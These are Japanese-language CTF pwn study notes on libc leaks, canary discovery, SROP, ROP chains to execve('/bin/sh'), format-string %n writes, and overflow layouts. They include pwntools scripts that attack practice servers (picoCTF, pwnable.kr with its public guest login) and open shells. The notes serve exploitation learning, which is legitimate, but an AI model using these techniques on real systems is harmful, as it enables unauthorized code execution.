# pwn,reversing,binary  

## libcアドレス特定

```
#!/usr/bin/env python3
import time
import warnings
from pwn import *

warnings.simplefilter('ignore', category = BytesWarning)

bin_file = './vuln'
binf = ELF(bin_file, checksec = False)
context.binary = binf

libc = binf.libc
offset_libc_atoi = libc.symbols['atoi']

#libc.address = 漏洩させたgotアドレスの中身(今回はatoi) - libcのatoiアドレス
libc.address = addr_libc_atoi - offset_libc_atoi

```


## カナリアの特定(pwntools)

### FSBでカナリアを特定する

%p %p %p...としていったときに、**毎回値がランダムになってかつ末尾2ケタが00**がカナリア  
あとは、うまくパディングしてcanaryに見つけた値をくっつければいい  
https://ir0nstone.gitbook.io/notes/types/stack/canaries


## SROP
### sigreturnシステムコール
プログラム動作中にシグナルが発生すると、カーネルはプロセスを一時停止してシグナルハンドラを呼び出す  
その際、カーネルはシグナルを受け取ったときの状態をスタックに保存しておく。  
シグナルハンドラの処理が終わるとsigreturn()が呼び出される。  
sigreturn()はスタックから値をpopして元のプロセスのコンテキスト（プロセッサフラグ、レジスタ等）を復元する  
（そのおかげで、シグナルにより割り込まれた場所から元のプロセスを再開できる）。  

**raxレジスタにsigreturnのシステムコール番号を設定しsyscallする＋偽造sigframeという形でROPチェーンを組む。  
これでsigreturnが発生し、その後にあるsigframeを読み込んでシェルが起動する。**


### 必要なガジェット  

``` mov rax, 0x0f; syscall; ret ```  


### SigreturnFrame()の返り値に対してexecve('/bin/sh')を実行するためのレジスタの設定  

```pwntools
sigret_frame = SigreturnFrame()
sigret_frame.rax = constants.SYS_execve
sigret_frame.rdi = addr_binsh
sigret_frame.rsi = 0
sigret_frame.rdx = 0
sigret_frame.rip = syscall_ret

```

## mov命令とbssセクションを利用したROP
mov QWORD ptr [rax] , rdx
rdxにbssセクションにつっこむ値をセット(末尾に\x00にすること)  
raxにbssセクションをセットすればmvでrdxの値をbssセクションに書き込める

```
rop = ROP(binf)

    rop.raw(rop.rdx)
    rop.raw('/bin/sh\x00')  # "\x00"を省略すると失敗する
    rop.raw(rop.rax)
    rop.raw(binf.bss())
    rop.raw(0x000000000048dd71)   #mov QWORD ptr [rax] , rdx


  # execve('/bin/sh', 0, 0)
    rop.raw(rop.rdi)
    rop.raw(binf.bss())
    rop.raw(rop.rsi)
    rop.raw(0)
    rop.raw(rop.rdx)
    rop.raw(0)
    rop.raw(rop.rax)
    rop.raw(constants.SYS_execve)
    rop.raw(rop.syscall.address)
```

## __stack_chk_failを利用したGOT Overwrite

Canaryがある場合にできるgot overwriteで、
Canary破壊を検知すると__stack_chk_failが発火するのを利用して  
CanaryにROPを組んで__stack_chk_failをわざと実行させることでROPを実行させる  
ただし、そのためにはlibc addrリークや実態アドレスを表示できる関数(すでに呼び出されている関数)が必要  

## return_to_dl_resolve
動的リンカである、_dl_runtime_resolve()を利用したエクスプロイト手法  
なお、関数が初めて呼び出されるまでそのアドレスを解決しない方式  

### 関数の呼び出し前と呼び出し後  
  
呼び出される前  
・.pltセクションは、関数のアドレスを.got.pltセクションから探す  
・もしGOTがアドレスをもってない(lazy_bindingのため)場合  
→PLTは、_dl_runtime_resolve()を呼び出す  
・この関数によって、主要なELFイメージである.dynstrセクションで'puts\0'という  
NULL終端文字列を見つけて、すべてのロードされた共有オブジェクトでputs()のアドレスを見つける  
  
呼び出された後  
・_dl_runtime_resolve()は、.rela.plt .dynsym そして、  
.dynstrのセクションのアドレスを見つけるために、.dynamicセクションを使用する  


## pwntoolsでFSBペイロードの作成

exit()のGOTをmain()のアドレスに書き換えてret2mainをする例  

```
fmtstr_payload(offset = 6, writes = {addr_got_exit: addr_main})
```

offset = 6というのは、aaaaaaaa %p %p %p %p %p %p %p %pという入力を与えた時、 
0x6161616161616161が6番目に現れたから。  

## 書式指定子攻撃

``` %n$p ``` を使用することで、  
わざわざ ``` %p %p %p ... ``` と入力する必要なく、  
何番目と指定することができる

``` 
//6番目がほしいとき
%6$p
```


"%x"などはスタック上にある値をそのまま出力するだけですが，"%s"はその値をポインタとして読んでくれます．  
そのため，スタック上に読みたいアドレスが置かれていれば，  
その引数の番号を"%n$s"のように指定することでデータを読み出すことができます．  
もちろん読み出せないアドレスが指定されるとSegmentation Faultで終了します．  

### %nでデータをメモリに書き込む
%nでは，printfが呼ばれてから%nを見つけるまでに出力された文字数を引数のポインタに書き込む  
例えば次のように使うとnに4が格納されます

```
printf("AAAA%n", &n);
```

これを上手いこと使えばメモリ上にデータを書き込める  
例えば次のようにすると，引数のアドレスに100という値を書き込むことができる  
```
printf("%100c%n", 1, &data);
```

これは非常に便利で，今回のように入力できる文字数に制限があるとき，  
「100文字+%n」を送らなくても「%100c%n」にまとめることができる  
他にも **%hhnを使えば，1バイトだけ書き込むこともできる**


### ベースアドレスの漏洩と書き込み

### 条件

スタック上を指すポインタがスタック上にある場合，任意のアドレスに任意のデータを書き込むことができる  
→つまり、一回目の書式指定で標的とするアドレスを任意のアドレスに、二回目の書式指定で一回目で入れ替えた任意のアドレスに任意の値を入れる
「スタック上を指すポインタ」の例としては，環境変数envpや実行時引数argvがあるので，大抵のプログラムでは見つけることができる  

### 何番目の引数かを探す

以下のような式で式数を見つけることができる
(0x<自分の書き込みたい任意のアドレス> - $esp) / 4 = <引数番号>  

#### 例: 0xffffcd08の引数を知りたい場合  

(0xffffcd08 - $esp)/4 = 2  
2番目の引数であることがわかる  

### 実践的な話
 例えば0xffffcd08に0xffffcddcというデータがあり．これを利用して0xdeadbeefに0x41414141を書き込む場合，次のようにします．

1回目のFSBで0xffffcddcに0xdeadbeefという値を書き込む
2回目のFSBで（0xffffcddcにある）0xdeadbeefに0x41414141を書き込む

具体的に送るデータを考えましょう．まず，0xffffcddcに0xdeadbeefを書き込むためには，0xffffcd08にあるアドレスを利用します．  
これは(0xffffcd08 - $esp)/4 = 2より2番目の引数にあたるので，0xdeadbeef(=3735928559)を書き込むには  

```
%3735928559c%2$n
```

とします．次に，0xffffcddcは(0xffffcddc - $esp)/4 = 55より55番目の引数にあたるので，0x41414141(=1094795585)を書き込むには  

```
%1094795585c%55$n
```

<br>
<br>
<br>

## bufferoverflow  

### リターンアドレスと引数を書き換える

パディング  
+  
飛ばしたいアドレス  
+  
4バイトのパディング(ret address)  
+  
引数1  
+  
引数2  
  

### リターンアドレスを書き換える

リターンアドレスは、**rbp+0x8の場所**に位置しているため、0x8分のパディングを忘れないようにすること  
また、32bitアーキテクチャの場合は、  
パディング  
+  
8byte(rbp分のパディング)  
+   
4byte(パディング)   
+  
飛ばしたいアドレス  
の順番になる  
  
  
  
### 引数をつけて関数を飛ばす  

#### 引数のよりも前にリターンアドレスを書き換える！
パディング  
+  
8byte(rbp分のパディング)  
+   
4byte(パディング)   
+  
飛ばしたいアドレス  
+  
4byte(ret分のパディング)  
+  
引数1  
+  
引数2  
の順番になる  
https://tech.kusuwada.com/entry/2019/10/12/023145#section1  
  
  
### 実行ファイルからバイナリコードを抽出する  
``` objdump -M intel -d a.out | grep '^ ' | cut -f2 | perl -pe 's/(\w{2})\s+/\\x\1/g' ```  
  
  
  
### シェルコードをインジェクションする  
シェルコード  
+  
本来のパディング数 - シェルコードの文字数  
+  
8byte(パディング)  
+  
バッファーアドレス  


### pwntoolsメモ
#### うまく実行したコードが刺さらないとき  
``` context.log_level = "debug" ```  
にすることで、recvした際にどのようなデータが飛んできているのかがわかる  

### ROPGadgetを使用する際の注意点  
ROPGadgetではオプションでpythonスクリプトを自動で出力してくれる機能があるが、  
**これを使用するとうまく刺さらないことがある。**  
#### 対処法  
pwntoolsに実装されているchain()を使うことで刺さる  
<details> 
<summary>実装例を表示する </summary> 
  
```
from pwn import *

elf = ELF("vuln")
context.binary = elf
context.kernel = "amd64"

s = remote("saturn.picoctf.net", 65000)
#s = remote("localhost", 8888)

rop = ROP(elf)
rop.gets(0x080e5060)
rop.execve(0x080e5060, 0, 0)
print(rop.dump())
s.sendline(b"a"*0x1c+rop.chain())

s.sendline(b"/bin/sh")

s.interactive()
```
  
</details> 
  

### プログラムが/opt/glibc直下のlibcやld-linuxを参照している場合
  
以下のようなエラーが出る場合がそれにあたる  
./quotes_list: error while loading shared libraries: libc.so.6: cannot open shared object file: No such file or directory  

patchelfで修正してあげる  

```
patchelf --set-interpreter ld-linux-x86-64.sp.2 quotes_list
patchelf --set-rpath `pwd` quotes_list
```




### C言語の関数内の脆弱性

#### rand()を呼び出した際に引数に何も渡さない場合の脆弱性
rand()内になにも引数を渡さない場合は、何回プログラムを実行しても同じ値がrandomに代入される。  
また、key^randomの^はXOR演算子と呼ばれるもので特徴として**a^(a^b) == b となる。**  
例:  0xrandomの値が格納されているアドレス ^ 0xdeadbeef を入力すれば、0xdeadbeefが解になる。

```
from pwn import *

payload = 0x6b8b4567 ^ 0xdeadbeef
s1 = ssh(host="pwnable.kr", user="random", password="guest", port=2222)
r = s1.process("./random")
r.sendline(str(payload).encode())
r.interactive()
```
